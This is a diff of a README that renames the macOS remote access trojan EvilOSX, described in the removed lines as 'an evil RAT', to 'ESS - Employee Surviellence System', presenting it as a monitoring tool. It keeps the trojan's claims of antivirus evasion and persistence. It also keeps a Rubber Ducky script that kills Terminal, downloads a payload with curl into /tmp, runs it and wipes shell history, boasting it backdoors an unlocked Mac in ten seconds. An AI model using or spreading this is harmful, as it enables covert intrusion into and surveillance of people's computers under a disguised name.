@@ -1,40 +1,34 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/Marten4n6/EvilOSX"><img src="/data/images/logo.png?raw=true" alt="Logo" width="280"></a>
+  <a href="https://github.com/Hackshu/ESS"><img src="/data/images/logo.png?raw=true" alt="Logo" width="280"></a>
   <br>
-  EvilOSX
+  ESS - Employee Surviellence System
   <br>
 </h1>
 
-<h4 align="center">An evil RAT (Remote Administration Tool) for macOS / OS X.</h4>
+<h4 align="center">A modern Solution for Monitoring the employees.</h4>
 
 <p align="center">
-  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
+  <a href="https://github.com/Hackshu/blob/master/LICENSE.txt">
       <img src="https://img.shields.io/badge/license-GPLv3-blue.svg?style=flat-square" alt="License">
   </a>
-  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
+  <a href="https://github.com/Hackshu/ESS/blob/master/LICENSE.txt">
       <img src="https://img.shields.io/badge/python-2.7,%203.7-blue.svg?style=flat-square" alt="Python">
   </a>
-  <a href="https://github.com/Marten4n6/EvilOSX/issues">
-    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg?style=flat-square" alt="Issues">
-  </a>
-  <a href="https://travis-ci.org/Marten4n6/EvilOSX">
-      <img src="https://img.shields.io/travis/Marten4n6/EvilOSX/master.svg?style=flat-square" alt="Build Status">
-  </a>
-  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md">
-      <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square" alt="Contributing">
+  <a href="https://github.com/Hackshu/ESS/issues">
+    <img src="https://img.shields.io/github/issues/Hackshu/ESS.svg?style=flat-square" alt="Issues">
   </a>
 </p>
 
 ---
 
-[Marco Generator](https://github.com/cedowens/EvilOSX_MacroGenerator) by Cedric Owens
+[Marco Generator](https://github.com/cedowens/ESS_MacroGenerator) by Cedric Owens
 
 ### This project is no longer active
 
 ## Features
 - Emulate a terminal instance
-- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md) system
+- Simple extendable [module](https://github.com/Hackshu/ESS/blob/master/CONTRIBUTING.md) system
 - No bot dependencies (pure python)
 - Undetected by anti-virus (OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads)
 - Persistent
@@ -53,10 +47,10 @@
 
 ```bash
 # Clone or download this repository
-$ git clone https://github.com/Marten4n6/EvilOSX
+$ git clone https://github.com/Hackshu/ESS
 
 # Go into the repository
-$ cd EvilOSX
+$ cd ESS
 
 # Install dependencies required by the server
 $ sudo pip install -r requirements.txt
@@ -90,7 +84,7 @@ $ python start.py --cli --port 1337
 ## Motivation
 This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
 ```
-REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
+REM Download and execute ESS @ https://github.com/Hackshu/ESS
 REM See also: https://ducktoolkit.com/vidpid/
 
 DELAY 1000
@@ -105,7 +99,7 @@ REM Kill all terminals after x seconds
 STRING screen -dm bash -c 'sleep 6; killall Terminal'
 ENTER
 
-STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
+STRING cd /tmp; curl -s HOST_TO_ESS.py -o 1337.py; python 1337.py; history -cw; clear
 ENTER
 ```
 - It takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
@@ -115,7 +109,7 @@ ENTER
 
 
 ## Versioning
-EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
+ESS will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
 Server and bot releases will be numbered with the follow format:
 ```
 <major>.<minor>.<patch>
@@ -140,10 +134,10 @@ For more information on SemVer, please visit https://semver.org/.
 - Since the bot only communicates with the server and never the other way around, the server has no way of knowing when a bot goes offline
 
 ## Issues
-Feel free to submit any issues or feature requests [here](https://github.com/Marten4n6/EvilOSX/issues).
+Feel free to submit any issues or feature requests [here](https://github.com/Hackshu/ESS/issues).
 
 ## Contributing
-For a simple guide on how to create modules click [here](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md).
+For a simple guide on how to create modules click [here](https://github.com/Hackshu/ESS/blob/master/CONTRIBUTING.md).
 
 ## Credits
 - The awesome [Empire](https://github.com/EmpireProject) project
@@ -155,5 +149,5 @@ For a simple guide on how to create modules click [here](https://github.com/Mart
 - Logo created by [motusora](https://www.behance.net/motusora)
 
 ## License
-[GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
+[GPLv3](https://github.com/Hackshu/ESS/blob/master/LICENSE.txt)
 # ESS
